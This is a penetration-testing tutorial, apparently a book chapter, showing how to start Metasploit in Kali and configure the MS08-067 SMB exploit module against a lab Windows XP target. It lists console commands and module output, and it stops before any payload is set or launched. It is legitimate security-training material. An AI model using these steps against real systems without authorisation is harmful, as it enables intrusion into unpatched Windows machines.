### Optimizing Tasks and Automating with Metasploit

Efforts are often better spent on tasks that are challenging to automate. Fortunately, Metasploit can simplify the exploitation of known vulnerabilities, such as MS08-067, making the process quick and efficient.

### Starting Metasploit

Let's begin by starting Metasploit and attacking our first system. In Kali Linux, Metasploit is included in the system path, allowing you to start it from any location. However, before initiating Metasploit, ensure that the PostgreSQL database is running, as Metasploit uses it to track your activities.

```bash
root@kali:~# service postgresql start
```

Now, you are ready to start the Metasploit service. This command creates a PostgreSQL user named `msf3` and a corresponding database to store your data. It also starts Metasploit’s remote procedure call (RPC) server and web server.

```bash
root@kali:~# service metasploit start
```

### Using Metasploit Interfaces

Metasploit offers multiple interfaces for use. In this chapter, we will focus on `Msfconsole`, the text-based console, and `Msfcli`, the command-line interface. Both interfaces can run Metasploit modules, but I prefer using `Msfconsole`. Start the console by entering:

```bash
root@kali:~# msfconsole
```

If `Msfconsole` appears to hang for a minute or two, do not be alarmed; it is loading the Metasploit module tree. Once it finishes, you will see some ASCII art, version information, and an `msf >` prompt.

```plaintext
 , ,
/ \
((__---,,,---__))
(_) O O (_)_________
\ _ / |\
o_o \ M S F | \
\ _____ | *
||| WW|||
||| |||

Large pentest? List, sort, group, tag, and search your hosts and services in Metasploit Pro -- type 'go_pro' to launch it now.
=[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]
+ -- --=[ 1246 exploits - 678 auxiliary - 198 post
+ -- --=[ 324 payloads - 32 encoders - 8 nops
msf >
```

As of this writing, Metasploit has 1,246 exploits, 678 auxiliary modules, and so forth. These numbers will likely increase over time, as new modules are continuously added to the Metasploit Framework, which is a community-driven project. Anyone can submit modules for inclusion.

If you need help while using `Msfconsole`, enter `help` for a list of available commands and their descriptions. For more detailed information about a specific command, use `help <command>`.

For example, the help information for the `route` command is shown below:

```plaintext
msf > help route
Usage: route [add/remove/get/flush/print] subnet netmask [comm/sid]
Route traffic destined to a given subnet through a supplied session.
The default comm is Local...
```

### Finding and Using Metasploit Modules

Let's explore how to use Metasploit to exploit an unpatched vulnerability in a Windows XP target, specifically the one patched in Microsoft Security Bulletin MS08-067. We will assume this vulnerability exists on our target system. In subsequent chapters, we will cover the steps to discover this and other vulnerabilities.

MS08-067 addressed a flaw in `netapi32.dll` that allowed attackers to use a specially crafted remote procedure call via the Server Message Block (SMB) service to take control of a target system. This vulnerability is particularly dangerous because it does not require authentication. It gained notoriety as the vulnerability exploited by the Conficker worm.

Despite its age, this vulnerability is still commonly found in penetration testing, especially in internal networks. The MS08-067 module in Metasploit is easy to use and has a high success rate, making it an ideal first example.

#### Finding the Module

To find the correct module, you can use Google, the online Metasploit module database (http://www.rapid7.com/db/modules/), or the built-in search function.

**Using the Online Database:**

Search for MS08-067 in the Microsoft Security Bulletin ID field. The results will provide the module name and additional information.

**Using the Built-In Search:**

You can also use Metasploit’s built-in search function:

```plaintext
msf > search ms08-067
Matching Modules
================
Name Disclosure Date Rank Description
---- --------------- ---- -----------
exploit/windows/smb/ms08_067_netapi 2008-10-28 00:00:00 UTC great Microsoft Server
Service Relative Path
Stack Corruption
```

Once you have identified the module, use the `info` command to get more details:

```plaintext
msf > info exploit/windows/smb/ms08_067_netapi
Name: Microsoft Server Service Relative Path Stack Corruption
Module: exploit/windows/smb/ms08_067_netapi
Version: 0
Platform: Windows
Privileged: Yes
License: Metasploit Framework License (BSD)
Rank: Great
Available targets:
Id Name
-- ----
0 Automatic Targeting
1 Windows 2000 Universal
2 Windows XP SP0/SP1 Universal
--snip--
67 Windows 2003 SP2 Spanish (NX)

Basic options:
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 445 yes Set the SMB service port
SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)

Payload information:
Space: 400
Avoid: 8 characters

Description:
This module exploits a parsing flaw in the path canonicalization
code of NetAPI32.dll through the Server Service. This module is
capable of bypassing NX on some operating systems and service packs.
The correct target must be used to prevent the Server Service (along
with a dozen others in the same process) from crashing. Windows XP
targets seem to handle multiple successful exploitation events, but
2003 targets will often crash or hang on subsequent attempts. This
is just the first version of this module, full support for NX bypass
on 2003, along with other platforms, is still in development.

References:
http://www.microsoft.com/technet/security/bulletin/MS08-067.mspx
```

#### Setting Module Options

After confirming the module, use the `use` command to select it:

```plaintext
msf > use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) >
```

Next, set the required options:

```plaintext
msf exploit(ms08_067_netapi) > show options
Module options (exploit/windows/smb/ms08_067_netapi):
Name Current Setting Required Description
---- --------------- -------- -----------
RHOST yes The target address
RPORT 445 yes Set the SMB service port
SMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)

Exploit target:
Id Name
-- ----
0 Automatic Targeting
```

Set the `RHOST` option to the IP address of your target:

```plaintext
msf exploit(ms08_067_netapi) > set RHOST 192.168.20.10
```

The `RPORT` and `SMBPIPE` options can remain at their default values. For the `Exploit Target`, use `Automatic Targeting` to let Metasploit choose the appropriate target based on the SMB service fingerprint.

```plaintext
msf exploit(ms08_067_netapi) > set target 0
```

With these settings, you are now ready to exploit the vulnerability.